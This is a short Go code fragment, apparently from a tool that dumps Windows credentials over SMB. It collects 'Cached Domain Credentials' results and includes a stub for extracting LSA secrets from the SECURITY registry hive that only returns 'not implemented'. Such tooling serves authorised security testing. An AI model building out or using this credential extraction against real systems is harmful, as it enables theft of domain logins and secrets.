				Name:    "[*] Cached Domain Credentials",
				Entries: entries,
			}
			results = append(results, lsaSecret)
		}
	}

	return results, errors, nil
}

// ExtractLSASecrets extracts LSA secrets from the SECURITY registry hive
func ExtractLSASecrets(session *gosmb.Connection) ([]LSASecret, error) {
	return nil, fmt.Errorf("not implemented")
}
